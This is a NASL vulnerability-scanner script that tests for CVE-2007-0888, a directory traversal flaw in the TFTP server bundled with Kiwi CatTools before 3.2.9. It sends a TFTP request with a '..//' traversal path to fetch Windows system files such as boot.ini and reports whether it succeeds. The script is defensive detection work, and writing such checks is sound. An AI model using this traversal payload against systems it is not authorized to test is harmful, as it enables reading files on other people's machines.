# SPDX-FileCopyrightText: 2008 Ferdy Riphagen
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.80016");
  script_version("2025-04-15T05:54:49+0000");
  script_tag(name:"last_modification", value:"2025-04-15 05:54:49 +0000 (Tue, 15 Apr 2025)");
  script_tag(name:"creation_date", value:"2008-10-24 19:51:47 +0200 (Fri, 24 Oct 2008)");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_cve_id("CVE-2007-0888");
  script_xref(name:"OSVDB", value:"33162");
  script_name("Kiwi CatTools < 3.2.9 Directory Traversal");
  script_category(ACT_ATTACK);
  script_family("Remote file access");
  script_copyright("Copyright (C) 2008 Ferdy Riphagen");
  script_dependencies("tftpd_detect.nasl", "global_settings.nasl", "tftpd_backdoor.nasl", "os_detection.nasl");
  script_require_udp_ports("Services/udp/tftp", 69);
  script_mandatory_keys("tftp/detected");
  script_require_keys("Host/runs_windows");
  script_exclude_keys("keys/TARGET_IS_IPV6");

  script_tag(name:"solution", value:"Upgrade to Kiwi CatTools version 3.2.9 or later.");

  script_tag(name:"summary", value:"The remote host appears to be running Kiwi CatTools, a freeware
  application for device configuration management and is affected by a directory traversal vulnerability.");

  script_tag(name:"insight", value:"The TFTP server included with the version of Kiwi CatTools installed
  on the remote host fails to sanitize filenames of directory traversal sequences.");

  script_tag(name:"impact", value:"An attacker can exploit this issue to get or put arbitrary
  files on the affected host subject to the privileges of the user id
  under which the server operates, LOCAL SYSTEM by default.");

  script_xref(name:"URL", value:"http://www.securityfocus.com/archive/1/459500/30/0/threaded");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/22490");
  script_xref(name:"URL", value:"http://www.kiwisyslog.com/kb/idx/5/178/article/");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_vul");

  exit(0);
}

if(TARGET_IS_IPV6())
  exit(0);

include("host_details.inc");
include("os_func.inc");
include("misc_func.inc");
include("traversal_func.inc");
include("port_service_func.inc");
include("tftp.inc");

port = service_get_port(default:69, proto:"tftp", ipproto:"udp");

if(!tftp_has_reliable_get(port:port))
  exit(0);

files = traversal_files("windows");

foreach file (files) {

  get = tftp_get(port:port, path:"z//..//..//..//..//..//" + file);
  if(!get)
    continue;

  # In case the backdoor was missed by tftpd_backdoor.nasl (UDP is not reliable)
  #tftp_ms_backdoor(file: 'boot.ini', data: get, port: port);

  if (
      ("ECHO" >< get)                || ("SET " >< get)             ||
      ("export" >< get)              || ("EXPORT" >< get)           ||
      ("mode" >< get)                || ("MODE" >< get)             ||
      ("doskey" >< get)              || ("DOSKEY" >< get)           ||
      ("[boot loader]" >< get)       || ("[fonts]" >< get)          ||
      ("[extensions]" >< get)        || ("[mci extensions]" >< get) ||
      ("[files]" >< get)             || ("[Mail]" >< get)           ||
      ("[operating systems]" >< get) || ("for 16-bit app support" >< get)
  ) {
    report = string("The " + file + " file contains:\n", get);
    security_message(port:port, proto:"udp", data:report);
    exit(0);
  }
}

exit(99);
